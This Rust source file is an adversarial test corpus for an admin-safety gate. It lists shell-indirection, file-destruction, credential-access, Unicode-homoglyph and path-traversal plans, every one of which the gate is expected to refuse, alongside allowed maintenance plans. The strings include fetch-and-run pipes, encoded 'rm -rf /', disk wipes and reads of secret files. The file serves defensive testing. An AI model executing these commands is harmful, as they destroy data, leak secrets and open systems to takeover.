// SPDX-License-Identifier: MIT
// Copyright (c) 3000 Galion / galion-studio

//! Adversarial corpus for the admin-safety rule (security plan S3.1).
//!
//! Every entry is a plan an attacker could try to get an admin to sign. Each
//! one is dangerous, so the expected result for every entry is a refusal. It
//! is shared by `tests/adversarial.rs` (which asserts the refusal through a
//! real signed token) and `examples/attack_table.rs` (which prints the table
//! in docs/real-tests/hades-adversarial.md).

/// Attack family.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Family {
    /// Shell indirection: substitution, eval, `sh -c`, encodings, `${IFS}`, ...
    Shell,
    /// Deleting or overwriting files, disks or history.
    FileDestruction,
    /// Admin access, accounts, keys, firewall, secrets.
    Access,
    /// Non-ASCII look-alikes.
    Unicode,
    /// Path traversal in the target or plan.
    Traversal,
}

impl Family {
    /// Short label for the table.
    #[must_use]
    pub const fn label(self) -> &'static str {
        match self {
            Self::Shell => "shell",
            Self::FileDestruction => "file",
            Self::Access => "access",
            Self::Unicode => "unicode",
            Self::Traversal => "traversal",
        }
    }
}

/// One attack: family, target service, plan bytes.
pub struct Attack {
    pub family: Family,
    pub target: &'static str,
    pub plan: &'static str,
}

const fn a(family: Family, target: &'static str, plan: &'static str) -> Attack {
    Attack {
        family,
        target,
        plan,
    }
}

use Family::{Access, FileDestruction, Shell, Traversal, Unicode};

/// The default target: an ordinary, approvable service.
pub const T: &str = "galion-tuner";

/// Every attempted bypass. All of them must be refused.
pub const ATTACKS: &[Attack] = &[
    // ---- (1) shell syntax -------------------------------------------------
    a(Shell, T, "restart galion-tuner\nrun $(curl -s http://x/p)"),
    a(Shell, T, "run `curl -s http://x/p`"),
    a(Shell, T, "eval \"$PAYLOAD\""),
    a(Shell, T, "restart galion-tuner; eval $P"),
    a(Shell, T, "sh -c 'curl -s http://x/p'"),
    a(Shell, T, "bash -c 'curl -s http://x/p'"),
    a(Shell, T, "/bin/sh -c x"),
    a(Shell, T, "zsh -c x"),
    a(Shell, T, "echo cm0gLXJmIC8= | base64 -d | sh"),
    a(Shell, T, "echo OJWSAIBNOJTCALY= | base32 -d | sh"),
    a(Shell, T, "echo 726d202d7266202f | xxd -r -p | sh"),
    a(Shell, T, "printf '\\x72\\x6d -rf /' | sh"),
    a(Shell, T, "printf '\\162\\155 -rf /' | sh"),
    a(Shell, T, "rm${IFS}-rf${IFS}/var/lib/galion"),
    a(Shell, T, "rm$IFS-rf$IFS/"),
    a(Shell, T, "X=rm; $X -rf /var/lib/galion"),
    a(Shell, T, "alias ok='rm -rf /'; ok"),
    a(Shell, T, "alias restart=reboot"),
    a(Shell, T, "r\\m -r\\f /var/lib/galion"),
    a(Shell, T, "rm -\\\nrf /var/lib/galion"),
    a(Shell, T, "r'm' -rf /var/lib/galion"),
    a(Shell, T, "r\"m\" -rf /var/lib/galion"),
    a(Shell, T, "env -S 'rm -rf /'"),
    a(Shell, T, "env -S'sh -c x'"),
    a(Shell, T, "echo /var/lib/galion | xargs rm -rf"),
    a(Shell, T, "echo /var/lib/galion | xargs -I{} rm -r -f {}"),
    a(Shell, T, "cat <(curl -s http://x/p)"),
    a(Shell, T, "curl -s http://x/p | sh"),
    a(Shell, T, "wget -qO- http://x/p | sh"),
    a(Shell, T, "source /tmp/p"),
    a(Shell, T, ". /tmp/p"),
    a(Shell, T, "exec /tmp/p"),
    a(Shell, T, "nohup /tmp/p &"),
    a(Shell, T, "awk 'BEGIN{system(\"id\")}'"),
    a(Shell, T, "perl -e 'system(1)'"),
    a(Shell, T, "find / -name x -exec sh {} +"),
    a(Shell, T, "restart galion-tuner && curl http://x | sh"),
    a(Shell, T, "{rm,-rf,/var/lib/galion}"),
    a(Shell, T, "rm -r''f /var/lib/galion"),
    // ---- (2) file destruction ---------------------------------------------
    a(FileDestruction, T, "find /var/lib/galion -delete"),
    a(FileDestruction, T, "find / -mindepth 1 -delete"),
    a(FileDestruction, T, "dd if=/dev/zero of=/dev/sda bs=1M"),
    a(FileDestruction, T, "dd of=/dev/vda"),
    a(FileDestruction, T, "dd bs=1M of=/dev/sda if=/dev/zero"),
    a(FileDestruction, T, "dd  bs=1M  of=/dev/nvme0n1"),
    a(FileDestruction, T, "cat /dev/zero > /dev/sda"),
    a(FileDestruction, T, "cat /dev/zero >/dev/xvda"),
    a(
        FileDestruction,
        T,
        "truncate -s 0 /var/lib/galion/memory.db",
    ),
    a(FileDestruction, T, "shred -u /var/lib/galion/memory.db"),
    a(FileDestruction, T, "echo > /etc/fstab"),
    a(FileDestruction, T, "echo x >/etc/hosts"),
    a(FileDestruction, T, ": > /var/lib/galion/memory.db"),
    a(
        FileDestruction,
        T,
        "echo nameserver 0.0.0.0 >> /etc/resolv.conf",
    ),
    a(FileDestruction, T, "cp /dev/null /var/lib/galion/memory.db"),
    a(
        FileDestruction,
        T,
        "mv /tmp/x /etc/systemd/system/galion-one.service",
    ),
    a(FileDestruction, T, "mv /dev/null /var/lib/galion/memory.db"),
    a(
        FileDestruction,
        T,
        "rsync -a --delete /empty/ /var/lib/galion/",
    ),
    a(
        FileDestruction,
        T,
        "rsync -a --delete-after /empty/ /opt/galion/",
    ),
    a(FileDestruction, T, "tar -xf /tmp/x.tar --overwrite -C /etc"),
    a(FileDestruction, T, "tar --overwrite -xf /tmp/x.tar -C /"),
    a(FileDestruction, T, "tar -xf /tmp/x.tar -C /"),
    a(FileDestruction, T, "rm /var/lib/galion/memory.db"),
    a(FileDestruction, T, "rm -v /var/lib/galion/memory.db"),
    a(FileDestruction, T, "rm --dir /var/lib/galion"),
    a(FileDestruction, T, "unlink /var/lib/galion/memory.db"),
    a(
        FileDestruction,
        T,
        "sqlite3 memory.db 'DELETE FROM memories'",
    ),
    a(FileDestruction, T, "git push origin +main"),
    a(
        FileDestruction,
        T,
        "git push --force-with-lease origin main",
    ),
    a(FileDestruction, T, "git checkout -- ."),
    a(FileDestruction, T, "git clean -xdf"),
    a(FileDestruction, T, "install -m 644 /tmp/x /etc/sudoers.d/x"),
    a(
        FileDestruction,
        T,
        "ln -sf /dev/null /var/lib/galion/memory.db",
    ),
    a(FileDestruction, T, "mkswap /dev/sda1"),
    a(FileDestruction, T, "mount -o remount,ro /"),
    a(FileDestruction, T, "sed -i d /etc/fstab"),
    a(FileDestruction, T, "tee /etc/fstab < /dev/null"),
    // ---- (3) access / credentials -----------------------------------------
    a(Access, T, "systemctl mask galion-one"),
    a(Access, T, "systemctl disable --now galion-one"),
    a(Access, T, "systemctl stop galion-control"),
    a(Access, T, "systemctl mask ssh.socket"),
    a(Access, T, "systemctl isolate rescue.target"),
    a(Access, T, "systemctl kill galion-tuner"),
    a(Access, T, "crontab -r"),
    a(Access, T, "echo '* * * * * root /tmp/p' > /etc/cron.d/x"),
    a(Access, T, "ssh-keygen -f /tmp/k -N ''"),
    a(Access, T, "ssh-copy-id slavik@box"),
    a(Access, T, "echo ssh-ed25519 AAAA >> ~/.ssh/authorized_keys"),
    a(Access, T, "cp /tmp/k /root/.ssh/authorized_keys2"),
    a(Access, T, "chattr +i /etc/resolv.conf"),
    a(Access, T, "usermod -L slavik"),
    a(Access, T, "passwd -l root"),
    a(Access, T, "echo slavik:x | chpasswd"),
    a(Access, T, "iptables -F"),
    a(Access, T, "iptables-restore < /tmp/r"),
    a(Access, T, "nft flush ruleset"),
    a(Access, T, "ip link set eth0 down"),
    a(Access, T, "ip route del default"),
    a(Access, T, "cat /opt/galion/galion-light/secrets/github"),
    a(Access, T, "ls /opt/galion/galion-light/secrets"),
    a(Access, T, "tar -cf /tmp/s.tar /root/galion-secrets"),
    a(Access, T, "cat /root/.config/gh/hosts.yml"),
    a(Access, T, "cat /etc/cloudflared/cert.pem"),
    a(Access, T, "cat ~/.cloudflared/x.json"),
    a(Access, T, "cat /proc/self/environ"),
    a(Access, T, "strings /proc/1/environ"),
    a(Access, T, "gpg --export-secret-keys"),
    a(Access, T, "setcap cap_sys_admin+ep /tmp/p"),
    a(Access, T, "chmod u+s /tmp/p"),
    a(Access, T, "sysctl -w kernel.modules_disabled=1"),
    a(Access, T, "modprobe -r e1000"),
    a(Access, T, "kill -9 1"),
    a(Access, T, "pkill sshd"),
    a(Access, T, "touch /opt/galion/hades/DISABLED"),
    a(Access, T, "curl -X POST http://127.0.0.1:19410/v1/stop"),
    // ---- Unicode / homoglyph ----------------------------------------------
    a(Unicode, T, "r\u{043c} -rf /var/lib/galion"),
    a(Unicode, T, "rm\u{00a0}-rf /var/lib/galion"),
    a(Unicode, T, "rm -rf /var/lib/galion\u{200b}"),
    a(Unicode, T, "\u{ff52}\u{ff4d} -rf /"),
    a(Unicode, T, "rm \u{2010}rf /var/lib/galion"),
    a(Unicode, T, "restart galion-tuner\u{202e}fr- mr"),
    a(Unicode, T, "rm -rf /\r"),
    a(Unicode, "galion-tun\u{0435}r", "restart galion-tuner"),
    a(Unicode, "h\u{0430}des-gate", "restart"),
    // ---- path traversal ---------------------------------------------------
    a(Traversal, T, "switch dist/bin to ../../etc"),
    a(Traversal, T, "operator runs deploy/../../../tmp/p.sh"),
    a(Traversal, T, "switch dist/bin to /etc/systemd/system"),
    a(Traversal, T, "operator runs /tmp/p.sh"),
    a(Traversal, T, "operator runs deploy/rollback.sh/../../tmp/p"),
    a(Traversal, T, "switch dist/bin to dist/../../root"),
    a(Traversal, "../sshd", "restart"),
    a(Traversal, "galion-tuner/../../hades-gate", "restart"),
    a(Traversal, "..", "restart"),
    a(Traversal, "galion-tuner..hades", "restart"),
    a(Traversal, "galion-tuner:22", "restart"),
    a(Traversal, "root@galion-tuner", "restart"),
    a(Traversal, "galion-tuner", "restart galion-control"),
    a(Traversal, "galion-tuner", "restart hades-gate"),
    a(Traversal, "galion-tuner", "restart ssh"),
    // ---- round 2: attacks on the allow-list itself ------------------------
    a(Shell, T, "restart galion-tuner\n\n   \nrestart hades-gate"),
    a(Shell, T, "verify /health on 127.0.0.1:8420 ; reboot"),
    a(Shell, T, "verify /health on 127.0.0.1:8420#x"),
    a(Shell, T, "RESTART galion-tuner\nSTART [\"/bin/sh\",\"-c\",\"id\"] detached in its own process group, stdin closed, no shell"),
    a(Shell, T, "apply at most 12 allow-listed fixes\nstart [\"/x/gaia-dummy\"] detached in its own process group, stdin closed, no shell"),
    a(Shell, "gaia-dummy", "service gaia-dummy on 127.0.0.1:19231 (box test ports 19000-19999 only)\nstart [\"/x/gaia-dummy\",\"--exec\",\"sh -c id\"] detached in its own process group, stdin closed, no shell"),
    a(Shell, "gaia-dummy", "service gaia-dummy on 127.0.0.1:19231 (box test ports 19000-19999 only)\nstart [\"/x/gaia-dummy\",\"--port\",\"19231\"] , \"/bin/sh\"] detached in its own process group, stdin closed, no shell"),
    a(Shell, "gaia-dummy", "service gaia-dummy on 127.0.0.1:19231 (box test ports 19000-19999 only)\nstart [\"/x/gaia-dummy\",\"\\u002e\\u002e\"] detached in its own process group, stdin closed, no shell"),
    a(Access, "gaia-dummy", "service gaia-dummy on 127.0.0.1:19231 (box test ports 19000-19999 only)\nstart [\"/x/gaia-dummy\",\"--config=/etc/sudoers.d/x\"] detached in its own process group, stdin closed, no shell"),
    a(Access, "gaia-dummy", "service gaia-dummy on 127.0.0.1:19231 (box test ports 19000-19999 only)\nstart [\"/proc/self/root/x/gaia-dummy\"] detached in its own process group, stdin closed, no shell"),
    a(FileDestruction, "gaia-dummy", "service gaia-dummy on 127.0.0.1:19231 (box test ports 19000-19999 only)\nstart [\"/x/gaia-dummy\",\"--data\",\"/\"] detached in its own process group, stdin closed, no shell"),
    a(Traversal, T, "operator runs deploy/rollback.sh (console: /tmp/p.sh)"),
    a(Traversal, T, "switch dist/bin to release 2026-10-20/../../etc"),
    a(Traversal, T, "switch dist/bin to release ../2026-10-20"),
    a(Traversal, T, "verify /health/../../v1/stop on 127.0.0.1:19410"),
    a(Traversal, T, "verify /health on 10.0.0.1:22"),
];

/// Plans that must keep working (GAIA templates and the existing tests).
pub const GOOD: &[(&str, &str)] = &[
    (T, "restart galion-tuner\nverify /health on 127.0.0.1:8420"),
    (T, "restart galion-tuner\nverify /health"),
    (T, "restart galion-tuner"),
    (
        T,
        "operator runs deploy/rollback.sh\nkeep the failed release for inspection",
    ),
    (T, "switch dist/bin to release 2026-10-20"),
    (
        "galion-one",
        "read the current and the previous release\noperator runs deploy/rollback.sh",
    ),
    (
        "galion-one",
        "read the current and the previous release\n\
         operator runs deploy/rollback.sh (console: deploy/rollback-console.sh)\n\
         verify /health on the previous release\n\
         keep the failed release for inspection\n\
         record the plan in lineage",
    ),
    (
        "galion-one",
        "take the heal-dry findings from DEMETER\n\
         apply at most 12 allow-listed fixes\n\
         append every action to actions.jsonl\n\
         record the plan in lineage",
    ),
    (
        "galion-one",
        "take the heal-dry findings from DEMETER\n\
         apply at most 3 allow-listed fixes\n\
         append every action to actions.jsonl\n\
         record the plan in lineage",
    ),
    (
        "galion-one",
        "operator runs deploy/switch.sh\nverify /health on 127.0.0.1:8420\nrecord the plan in lineage",
    ),
];
